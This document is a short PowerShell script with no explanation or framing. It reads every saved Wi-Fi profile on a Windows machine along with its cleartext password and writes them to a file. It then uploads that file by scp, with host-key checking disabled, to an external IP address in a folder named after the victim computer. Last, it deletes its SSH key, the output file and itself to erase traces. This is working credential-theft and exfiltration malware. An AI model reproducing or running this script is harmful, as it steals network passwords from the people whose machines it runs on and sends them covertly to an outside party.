(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} >> asdf2.txt

scp -o "StrictHostKeyChecking=no" -i ./asdf ./asdf2.txt nateg@147.182.151.141:/home/nateg/wifi/$env:computername

Remove-Item '.\asdf'
Remove-Item '.\asdf.pub'
Remove-Item '.\asdf2'
Remove-Item '.\d.ps1'
